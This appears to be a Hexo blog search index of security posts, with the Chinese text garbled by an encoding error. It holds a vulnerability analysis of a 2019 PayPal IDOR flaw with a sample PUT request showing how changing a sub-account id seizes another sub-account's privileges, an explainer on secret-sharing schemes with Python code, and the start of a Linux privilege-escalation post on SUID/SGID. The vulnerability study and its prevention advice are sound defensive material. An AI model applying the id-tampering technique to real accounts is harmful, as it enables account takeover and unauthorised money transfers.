<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ã€APIå®‰å…¨æ¼æ´å­¦ä¹ ã€‘Paypal IDOR æ¼æ´ - 2019-7-30</title>
      <link href="/2023/11/14/PayPal-IDOR-%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/11/14/PayPal-IDOR-%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€APIå®‰å…¨æ¼æ´å­¦ä¹ ã€‘Paypal-IDOR-æ¼æ´-2019-7-30"><a href="#ã€APIå®‰å…¨æ¼æ´å­¦ä¹ ã€‘Paypal-IDOR-æ¼æ´-2019-7-30" class="headerlink" title="ã€APIå®‰å…¨æ¼æ´å­¦ä¹ ã€‘Paypal IDOR æ¼æ´ - 2019-7-30"></a>ã€APIå®‰å…¨æ¼æ´å­¦ä¹ ã€‘Paypal IDOR æ¼æ´ - 2019-7-30</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>Paypal å¹³å°ä¸­å­˜åœ¨ä¼ä¸šè´¦å·ä¸å¯¹åº”çš„å­è´¦å·, ä¼ä¸šè´¦å·é€šè¿‡å§”æ‰˜æˆæƒå­è´¦å·æ¥ç®¡ç†è´¦å·ä¸Šçš„èµ„é‡‘, å¯¹äºä¸åŒçš„å­è´¦å·æ‹¥æœ‰<strong>ä¸åŒçš„æƒé™å’ŒåŠŸèƒ½</strong>.<br>ç”¨ä¸€å¼ å›¾æ¥ç†è§£å°±æ˜¯:</p><p><img src="/2023/11/14/PayPal-IDOR-%E6%BC%8F%E6%B4%9E/image.png"></p><p>æ”»å‡»è€…å‘ç°åœ¨è¿™ä¸ª Paypal çš„è¿™ä¸ªåŠŸèƒ½ä¸­å­˜åœ¨ IDOR<br> æ¼æ´, èƒ½å¤Ÿé€šè¿‡å®ç°å­è´¦å·é—´è¶Šæƒè®¿é—®.</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>IDOR (Insecure Direct Object Reference), åˆå¯¹è±¡çº§æˆæƒé—®é¢˜, å®ƒæ¶‰åŠåˆ°å¯¹Webåº”ç”¨ç¨‹åºæˆ–APIä¸­å¯¹è±¡çš„ä¸å®‰å…¨å¼•ç”¨ã€‚è¿™äº›å¯¹è±¡é€šå¸¸æ˜¯æ•°æ®åº“è®°å½•ã€æ–‡ä»¶ã€ç›®å½•ç­‰ã€‚å½“åº”ç”¨ç¨‹åºæä¾›å¯¹è¿™äº›å¯¹è±¡çš„ç›´æ¥è®¿é—®ï¼Œå¹¶ä¸”æ²¡æœ‰é€‚å½“åœ°å®æ–½è®¿é—®æ§åˆ¶æ—¶ï¼Œå°±ä¼šäº§ç”ŸIDORæ¼æ´ã€‚</p><p>å¸¸è§çš„ IDOR æ¼æ´æœ‰:</p><ol><li>ç”¨æˆ·æ•°æ®æ³„éœ²: é€šè¿‡ä¿®æ”¹ URL ä¸­çš„ ID è·å–å…¶ä»–ç”¨æˆ·çš„éšç§ä¿¡æ¯, æ›´ä¸¥é‡çš„åŒ…æ‹¬æ›´æ”¹, åˆ é™¤ä»–äººçš„ä¿¡æ¯.</li><li>æ–‡ä»¶è®¿é—®å’Œæ³„éœ²: å¯¹äºæœ¬æ²¡æœ‰æƒé™è®¿é—®çš„æ–‡ä»¶, é€šè¿‡ä¿®æ”¹ URL ä¸­æ–‡ä»¶çš„ç¼–å·æ¥è¶Šæƒè®¿é—®.</li></ol><p>åœ¨æœ¬æ¬¡æ¼æ´ä¸­, æ”»å‡»è¿™å‘ç°â€œæŸ¥çœ‹å­è´¦å·â€åŠŸèƒ½ä¸­æœ‰ä¸€ä¸ª URL ä¸º <code>https://www.paypal.com/businessmanage/users/1657893467745278998</code><br>å…¶ä¸­ <code>user</code> åé¢çš„ <code>1657893467745278998</code> æ˜¯å­è´¦å·æ‰€ç»‘å®šçš„ä¼ä¸šè´¦å· ID, ç´§æ¥ç€äº§ç”Ÿä¸€ä¸ª HTTP PUT è¯·æ±‚, å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /businessmanage/users/api/v1/users? HTTP/1.1</span><br><span class="line">Host: www.paypal.com</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:&quot;1657893467745278998&quot;,&quot;accessPoint&quot;:&#123;&quot;privileges&quot;:[&quot;MANUAL_REFERENCE_TXN&quot;,&quot;VIEW_CUSTOMERS&quot;,&quot;SEND_MONEY&quot;],&quot;id&quot;:&quot;5994224506&quot;,&quot;accounts&quot;:[&quot;attacker@gmail.com&quot;]&#125;,&quot;roleID&quot;:0,&quot;roleName&quot;:&quot;CUSTOM&quot;,&quot;privilegeChanged&quot;:true,&quot;privilegeSecondaryName&quot;:&quot;A1&quot;&#125;]</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™ä¸ª API, ä»–é€šè¿‡ä¹‹å‰ä¸Šé¢çš„ API å‘ç°ç¬¬ä¸€ä¸ª <code>id</code> å‚æ•°å€¼æ˜¯ä¼ä¸šè´¦å·çš„ id, ä»–å¾ˆå¿«å°±èƒ½ç¡®å®šç¬¬äºŒä¸ª <code>id</code> æ˜¯å­è´¦å·çš„ id äº†, åœ¨è¿™é‡Œç¬¬äºŒä¸ª <code>id</code> çš„å†…å®¹æ˜¯ç®€å•çš„æ•°å€¼ç±»å‹, è€Œä¸”è¿™ä¸ª <code>id</code> æ˜¯ç®€å•çš„é€’å¢æˆ–é€’å‡çš„, æ˜¯å®Œå…¨å¯ä»¥é€šè¿‡<strong>æšä¸¾</strong>çš„æ–¹å¼æ¥è·å–åˆ°å…¶ä»–è´¦å·çš„ id çš„,  å°† <code>5994224506</code> ä¿®æ”¹æˆ <code>5994224507</code> å°±å¯ä»¥è·å–åˆ°åŒä¸€ä¼ä¸šè´¦å·å…¶ä»–å­è´¦å·çš„æƒé™äº†.</p><h2 id="æ¼æ´å®æ–½"><a href="#æ¼æ´å®æ–½" class="headerlink" title="æ¼æ´å®æ–½"></a>æ¼æ´å®æ–½</h2><p>æ”»å‡»è€…æ ¹æ®ä¸Šè¿°æ¼æ´, ä¸ä»…å¯ä»¥æŸ¥çœ‹åˆ°å…³è”çš„å¦ä¸€ä¸ªå­è´¦å·çš„ä¿¡æ¯, è¿˜å¯ä»¥æŠŠå“åº”çš„å­è´¦å·å¯†ç è¿›è¡Œä¿®æ”¹å°±å¯ä»¥å®ç°è´¦å·æ¥ç®¡å¹¶ä¸”è¿›è¡Œä»»æ„æœªæˆæƒçš„è½¬è´¦æ“ä½œ.</p><h2 id="æ¼æ´å¯ç¤º"><a href="#æ¼æ´å¯ç¤º" class="headerlink" title="æ¼æ´å¯ç¤º"></a>æ¼æ´å¯ç¤º</h2><p>Paypal è¿™ä¸ªæ¼æ´çš„äº§ç”Ÿæœ‰ä¸¤ä¸ªä¸»è¦åŸå› :</p><ol><li>å­è´¦å·çš„ id å€¼å¯ä»¥é€šè¿‡æšä¸¾è¿›è¡ŒçŒœæµ‹</li><li>ä¸€ä½†è·å–åˆ° id æƒé™å¯ä»¥è¢«æ‰©å¤§, åç»­çš„è½¬è´¦æ“ä½œæ²¡æœ‰äºŒæ¬¡å¯¹å¯†ç ç­‰è¿›è¡Œç¡®è®¤</li></ol><p>é¢„é˜²è¿™ç§æ¼æ´, åœ¨å¼€å‘è¿‡ç¨‹ä¸­éœ€è¦ç•™æ„:</p><ol><li>å¢å¼º id å€¼çš„éšæœºæ€§</li><li>åœ¨æƒé™è®¿é—®æ§åˆ¶ä¸Š, è¦å¤šæ¬¡æ£€éªŒä¼ä¸šè´¦å·ä¸å­è´¦å·çš„ç»‘å®šå…³ç³», å¦‚æ¯æ¬¡è®¿é—®æ¶‰åŠå­è´¦å·æƒé™çš„æ“ä½œæ—¶, è¦æ±‚å…¶è¾“å…¥å¯†ç ,æˆ–è€…è¾“å…¥ç»‘å®šå·ç­‰.</li></ol>]]></content>
      
      
      <categories>
          
          <category> APIå®‰å…¨ </category>
          
          <category> æ¼æ´å‰–æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API å®‰å…¨ </tag>
            
            <tag> IDOR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€éšç§è®¡ç®—ã€‘ ç§˜å¯†å…±äº«æ–¹æ¡ˆ</title>
      <link href="/2023/11/13/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97-%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/"/>
      <url>/2023/11/13/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97-%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€éšç§è®¡ç®—ã€‘-ç§˜å¯†å…±äº«æ–¹æ¡ˆ"><a href="#ã€éšç§è®¡ç®—ã€‘-ç§˜å¯†å…±äº«æ–¹æ¡ˆ" class="headerlink" title="ã€éšç§è®¡ç®—ã€‘ ç§˜å¯†å…±äº«æ–¹æ¡ˆ"></a>ã€éšç§è®¡ç®—ã€‘ ç§˜å¯†å…±äº«æ–¹æ¡ˆ</h1><h2 id="Shamir-ç§˜å¯†å…±äº«æ–¹æ¡ˆ"><a href="#Shamir-ç§˜å¯†å…±äº«æ–¹æ¡ˆ" class="headerlink" title="Shamir ç§˜å¯†å…±äº«æ–¹æ¡ˆ"></a>Shamir ç§˜å¯†å…±äº«æ–¹æ¡ˆ</h2><p>Shamirâ€™s Secret Sharing Scheme is based on Lagrange Interception.</p><p>Now suppose there are $n$ people, and $t$ is the threshold for secret recovery</p><p>Construct a polynimal at first, the form like:</p><p>$$ P(x) &#x3D; a_{t-1}x^{t-1} + a_{t-2}x^{t-2} + \cdots + a_2x^2 + a_1x + a_0 $$</p><p>Setting $a_0$ as the secret. Each person is allocated a secret share represented as $(i, a_{i}x^{i})$.</p><p>For the secret recovery, we need to construct a Lagrange Interception to compute the coefficients $a_0$(secret). The Lagrange Interpolation method is as follows</p><p>$$L(x) &#x3D; \sum_{j&#x3D;0}^{n} y_j \prod_{\substack{i&#x3D;0 \ i \neq j}}^{n} \frac{x - x_i}{x_j - x_i}$$</p><p>In the above formula, by setting $x &#x3D; 0$, the value of  $a_0$ can be calculated.</p><p>Python code for implementing the Shamir Secret Sharing Scheme:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Shamir</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"> </span><br><span class="line"><span class="comment"># a large size, make sures that the shares can not to be brute-forced</span></span><br><span class="line">FIELD_SIZE = <span class="number">10</span>**<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_coefficients</span>(<span class="params">t, secret</span>):</span><br><span class="line">    coeff = [random.randrange(<span class="number">0</span>, FIELD_SIZE) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t-<span class="number">1</span>)]</span><br><span class="line">    coeff.append(secret) <span class="comment"># secret is in the last</span></span><br><span class="line">    <span class="keyword">return</span> coeff</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_polynomial</span>(<span class="params">x, coefficients</span>):</span><br><span class="line">    polynomial = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> index, values <span class="keyword">in</span> <span class="built_in">enumerate</span>(coefficients[::-<span class="number">1</span>]): <span class="comment"># we need to reverse in here because the secret(a0) is in the last</span></span><br><span class="line">        polynomial += x ** index * values</span><br><span class="line">    <span class="keyword">return</span> polynomial</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shares</span>(<span class="params">n, t, secret</span>):</span><br><span class="line">    coefficients = compute_coefficients(t,secret)</span><br><span class="line">    shares = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">        x = random.randrange(<span class="number">0</span>,FIELD_SIZE)</span><br><span class="line">        shares.append((x, compute_polynomial(x,coefficients)))</span><br><span class="line">    <span class="keyword">return</span> shares</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_secret</span>(<span class="params">shares</span>):</span><br><span class="line">    sums = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, share_i <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):</span><br><span class="line">        xi, yi = share_i</span><br><span class="line">        <span class="comment"># use decimal to make sure that we can get an accurate integer</span></span><br><span class="line">        prod = Decimal(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> j, share_j <span class="keyword">in</span> <span class="built_in">enumerate</span>(shares):</span><br><span class="line">            xj, _ = share_j</span><br><span class="line">            <span class="keyword">if</span> i!=j:</span><br><span class="line">                prod *= Decimal(Decimal(xj)/(xj-xi)) <span class="comment"># lagrange interception</span></span><br><span class="line">                </span><br><span class="line">        prod *= yi</span><br><span class="line">        sums += prod</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">round</span>(Decimal(sums),<span class="number">0</span>)) <span class="comment"># get the integer secret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Driver code</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># n peoples, and the threshold is t</span></span><br><span class="line">    t, n = <span class="number">3</span>, <span class="number">5</span></span><br><span class="line">    secret = <span class="number">114514</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Original Secret: <span class="subst">&#123;secret&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Generate the shares</span></span><br><span class="line">    shares = generate_shares(n, t, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Shares: <span class="subst">&#123;<span class="string">&quot;, &quot;</span>.join(<span class="built_in">str</span>(share) <span class="keyword">for</span> share <span class="keyword">in</span> shares)&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Reconstruct the secret</span></span><br><span class="line">    <span class="comment"># Picking t shares randomly for</span></span><br><span class="line">    pool = random.sample(shares, t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Reconstructed secret: <span class="subst">&#123;reconstruct_secret(pool)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Reference: <a href="https://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/">https://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/</a></p><h2 id="åŸºäºä¸­å›½å‰©ä½™å®šç†çš„ç§˜å¯†å…±äº«æ–¹æ¡ˆ"><a href="#åŸºäºä¸­å›½å‰©ä½™å®šç†çš„ç§˜å¯†å…±äº«æ–¹æ¡ˆ" class="headerlink" title="åŸºäºä¸­å›½å‰©ä½™å®šç†çš„ç§˜å¯†å…±äº«æ–¹æ¡ˆ"></a>åŸºäºä¸­å›½å‰©ä½™å®šç†çš„ç§˜å¯†å…±äº«æ–¹æ¡ˆ</h2><p>CRT(Chinese Remainder Theory) can be used to solve the Secret Sharing. My seudocode is as follow:</p><p><img src="/2023/11/13/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97-%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/image-1.png"></p><p>python code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŸºäºä¸­å›½å‰©ä½™å®šç†çš„ç§˜å¯†å…±äº«æ–¹æ¡ˆ</span></span><br><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> solve_crt,generate_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_primes</span>(<span class="params">n, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ç”Ÿæˆ n ä¸ªæ ¹æ® S è°ƒæ•´å¤§å°çš„éšæœºè´¨æ•°</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    lower_bound = <span class="number">10</span>  <span class="comment"># ä¸‹é™</span></span><br><span class="line">    upper_bound = <span class="built_in">int</span>(math.sqrt(S))  <span class="comment"># ä¸Šé™</span></span><br><span class="line">    primes = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        primes.append(sp.randprime(lower_bound, upper_bound))</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_conditions</span>(<span class="params">numbers, t, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ£€æŸ¥æ¡ä»¶æ˜¯å¦æ»¡è¶³</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numbers.sort()</span><br><span class="line">    product_smallest_t = math.prod(numbers[:t])</span><br><span class="line">    product_largest_t_minus_1 = math.prod(numbers[-(t-<span class="number">1</span>):])</span><br><span class="line">    <span class="keyword">return</span> product_smallest_t &gt; S <span class="keyword">and</span> product_largest_t_minus_1 &lt; S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_numbers</span>(<span class="params">n, t, S</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ n ä¸ªäº’è´¨éšæœºæ•°</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        numbers = generate_primes(n, S)</span><br><span class="line">        <span class="keyword">if</span> check_conditions(numbers, t, S):</span><br><span class="line">            <span class="keyword">return</span> numbers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_shares</span>(<span class="params">s, k, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Implements the Asmuth and Bloom&#x27;s CRT-based secret sharing algorithm.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    primes = find_numbers(n,k,s)</span><br><span class="line">    shares = [s % mi <span class="keyword">for</span> mi <span class="keyword">in</span> primes]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> shares, primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">select_random_k_elements</span>(<span class="params">shares_zip, k</span>):</span><br><span class="line">    random_selection = random.sample(shares_zip, k)</span><br><span class="line">    selected_shares, selected_moduli = <span class="built_in">zip</span>(*random_selection)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(selected_shares), <span class="built_in">list</span>(selected_moduli)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage:</span></span><br><span class="line">secret = <span class="number">1145141919</span>  <span class="comment"># The secret to be shared</span></span><br><span class="line">k = <span class="number">3</span>                <span class="comment"># Minimum number of shares needed to reconstruct the secret</span></span><br><span class="line">n = <span class="number">5</span>                <span class="comment"># Total number of shares to be distributed</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate the shares</span></span><br><span class="line">shares, moduli = generate_shares(secret, k, n)</span><br><span class="line">shares_zip = <span class="built_in">list</span>(<span class="built_in">zip</span>(shares, moduli))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shares:&quot;</span>, shares_zip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reconstruct the secret</span></span><br><span class="line">shares_pool, moduli_pool = select_random_k_elements(shares_zip, k)</span><br><span class="line">res = solve_crt(shares_pool,moduli_pool)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Secret:&quot;</span>, res)</span><br></pre></td></tr></table></figure><h2 id="Brickell-Secret-Sharing"><a href="#Brickell-Secret-Sharing" class="headerlink" title="Brickell Secret Sharing"></a>Brickell Secret Sharing</h2><p>The Brickell Secret Sharing Scheme is based on multi-dimensional vectors, allowing for the specification of designated groups for secret recovery.</p><p>Steps:</p><h3 id="Sharing-Generation"><a href="#Sharing-Generation" class="headerlink" title="Sharing Generation:"></a>Sharing Generation:</h3><ol><li>Assuming the secret &#x3D; $S$, $n$ &#x3D; 4, the vector dimension is $d$ &#x3D; 3.</li><li>Define the reconstruct rules ${(v1,v2,v3),(v1,v5)}$, means that person(1~3) and person(1 and 5) can recover the secret.</li><li>Generate v1 to v5, ensuring that any group of vectors can linearly construct $(1,0,0)$</li><li>Generate d-1 random numbers ${a_1,a_2â€¦,a_{d-1}}$. In here, generate $a_1 &#x3D; S, a_2 &#x3D; 55$, $a_3 &#x3D; 28$</li><li>Compute the sharing, $S_i &#x3D; a * v_i$, and the sharing is $(S_i, i)$</li></ol><h3 id="Secret-Reconstruction"><a href="#Secret-Reconstruction" class="headerlink" title="Secret Reconstruction"></a>Secret Reconstruction</h3><ol><li>Collect the sharing, ensuring that the sharing groups follow the rules ${(v1,v2,v3),(v1,v5)}$, assuming the $S_1 &#x3D; 55, S_2 &#x3D; 10, S_3 &#x3D; 17$</li><li>use the sharing group to linearly construct $(1,0,0)$, $c_1v_1+c_2v_2+c_3v_3 &#x3D; (1,0,0)$, get the coefficients $c_1&#x3D;-1, c_2&#x3D;1, c_3&#x3D;1$</li><li>Recover the $S$, $S &#x3D; c_1S_1+c_2S_2+c_3S_3$</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Secret sharing schemes are widely used in privacy computing. Here is a summary of their advantages and disadvantages.</p><h3 id="Advantages"><a href="#Advantages" class="headerlink" title="Advantages"></a>Advantages</h3><ol><li>It allows for the addition of new shareholders without changing the existing shareholdersâ€™ secret shares, demonstrating excellent scalability.</li><li>Based on the original shared secret key, the secret shares can be invalidated by altering other terms without changing the constant term.</li></ol><h3 id="Disadvantages"><a href="#Disadvantages" class="headerlink" title="Disadvantages"></a>Disadvantages</h3><ol><li>It relies on the credibility of the secret distributor. If the distributor is dishonest and distributes a fake share to a participant, it can cause confusion during the sharing process.</li><li>Some participants may submit invalid secret shares, preventing the correct secret from being recovered. A secure point-to-point channel needs to be established between the secret distributor and the participants.</li></ol>]]></content>
      
      
      <categories>
          
          <category> éšç§è®¡ç®— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç§è®¡ç®— </tag>
            
            <tag> ç§˜å¯†å…±äº« </tag>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€AWDã€‘Linux ææƒ - ä¿¡æ¯æšä¸¾</title>
      <link href="/2023/11/11/AWD-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"/>
      <url>/2023/11/11/AWD-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€AWDã€‘Linux-ææƒ-ä¿¡æ¯æšä¸¾"><a href="#ã€AWDã€‘Linux-ææƒ-ä¿¡æ¯æšä¸¾" class="headerlink" title="ã€AWDã€‘Linux ææƒ - ä¿¡æ¯æšä¸¾"></a>ã€AWDã€‘Linux ææƒ - ä¿¡æ¯æšä¸¾</h1><p>å¤§éƒ¨åˆ†æ”»é˜²åœºæ™¯, åœ¨ç»´æŒæƒé™è·å– shell å, å¾ˆå¯èƒ½ä¼šåˆ†é…åˆ°ä¸€ä¸ªä½æƒé™ç”¨æˆ·, ææƒåˆ° root çº§åˆ«çš„ç®¡ç†å‘˜ç”¨æˆ·æ‰æœ‰ getshell çš„æ„ä¹‰.</p><h2 id="æƒé™ä½“ç³»"><a href="#æƒé™ä½“ç³»" class="headerlink" title="æƒé™ä½“ç³»"></a>æƒé™ä½“ç³»</h2><h3 id="SUID-SGID"><a href="#SUID-SGID" class="headerlink" title="SUID SGID"></a>SUID SGID</h3><p><strong>SUID(Set User ID)</strong> å’Œ <strong>SGID(Set Group ID)</strong> ç»Ÿç§°ä¸º S ä½, è¢«è®¾ç½®åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸Š, å½“è¿™äº›ä½è¢«è®¾ç½®æ—¶ï¼Œæ–‡ä»¶æˆ–ç¨‹åºå°†ä»¥æ–‡ä»¶æ‰€æœ‰è€…æˆ–ç»„çš„æƒé™è¿è¡Œï¼Œè€Œä¸æ˜¯ä»¥è¿è¡Œå®ƒçš„ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚</p><ul><li>SUID: å½“ SUID ä½è¢«è®¾ç½®, æ— è®ºè°è¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶éƒ½ä¼šä»¥<strong>æ–‡ä»¶æ‰€æœ‰è€…</strong>çš„æƒé™æ‰§è¡Œ, SUIDä½é€šå¸¸è¡¨ç¤ºä¸ºæ–‡ä»¶æƒé™å­—ç¬¦ä¸²ä¸­çš„ä¸€ä¸ªså­—ç¬¦ï¼Œå¦‚æœæƒé™æ˜¯å¯æ‰§è¡Œçš„è¯ï¼Œå¦åˆ™å®ƒæ˜¯ä¸€ä¸ªå¤§å†™çš„Sã€‚</li><li>SGID: å½“ SGID ä½è¢«è®¾ç½®, è¯¥æ–‡ä»¶ä¼šä»¥æ–‡ä»¶ç»„çš„æƒé™æ‰§è¡Œã€‚å½“SGIDè®¾ç½®åœ¨ç›®å½•ä¸Šæ—¶ï¼Œåˆ›å»ºåœ¨è¯¥ç›®å½•ä¸‹çš„ä»»ä½•æ–°æ–‡ä»¶éƒ½ä¼šç»§æ‰¿è¯¥ç›®å½•çš„ç»„IDï¼Œè€Œä¸æ˜¯ç»§æ‰¿åˆ›å»ºå®ƒçš„ç”¨æˆ·çš„ä¸»ç»„IDã€‚SGIDä½åœ¨æ–‡ä»¶æƒé™å­—ç¬¦ä¸²ä¸­ä¹Ÿè¡¨ç¤ºä¸ºsæˆ–Sï¼Œå–å†³äºç»„æƒé™æ˜¯å¦å¯æ‰§è¡Œã€‚</li></ul><h3 id="AppArmor-SElinux"><a href="#AppArmor-SElinux" class="headerlink" title="AppArmor SElinux"></a>AppArmor 